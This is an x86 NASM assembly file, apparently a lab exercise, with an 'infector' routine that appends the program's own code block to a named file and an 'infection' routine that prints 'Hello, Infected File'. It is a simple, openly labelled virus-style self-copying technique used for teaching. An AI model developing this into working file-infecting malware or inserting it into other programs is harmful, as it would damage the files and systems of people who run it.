%define arg(n) dword [ebp+4*(2+n)]
%define clean_stack(n) add esp, 4*n
%define stmalloc(n) sub esp, n
%define sys_exit 1
%define sys_read 3
%define sys_write 4
%define sys_open 5
%define sys_close 6
%define stdin 0
%define stdout 1
%define stderr 2
%define O_RDONLY 0
%define O_WRONLY 1
%define O_RDWR 2
%define O_CREAT 64
%define O_TRUNC 512
%define O_APPEND 1024

section .data
    msg db "Hello, Infected File",0x0
    len equ $ - msg - 1
    space db 0x20,0x0
    newline db 0x0A,0x0

section .bss
    file resd 1

section .text
global _start
global system_call
global infection
global infector
extern strlen
extern strncmp
extern main
_start:
    pop     dword ecx    ; ecx = argc
    mov     esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret

code_start:

infection:
    ;;print msg to stout
    push ebp
    mov ebp, esp
    push len
    push msg
    push stdout
    push sys_write
    call system_call
    call print_newline
    mov esp, ebp
    pop ebp
    ret

infector:
    push ebp
    mov ebp, esp
    ;open file in arg(0)

    push 0644o
    push O_RDWR | O_CREAT | O_APPEND
    push arg(0)
    push sys_open
    call system_call
    clean_stack(4)
    mov [file], eax

    ; error checking
    cmp eax, 0
    jge no_error1
    call exit_err_55

    no_error1:
    ;write from code_start to code_end to file
    push code_end - code_start
    push code_start
    push dword [file]
    push sys_write
    call system_call

    ;error checking
    cmp eax, 0
    jge no_error2
    call exit_err_55

    no_error2:
    ;close file
    push 0
    push 0
    push dword [file]
    push sys_close
    call system_call

    ;error checking
    cmp eax, 0
    jge no_error3
    call exit_err_55

    no_error3:
    mov esp, ebp
    pop ebp
    ret

exit_err_55:
    push 0
    push 0
    push 0x55
    push sys_exit
    call system_call

print_newline:
    push ebp
    mov ebp, esp
    push 1
    push newline
    push stdout
    push sys_write
    call system_call
    mov esp, ebp
    pop ebp
    ret

code_end:



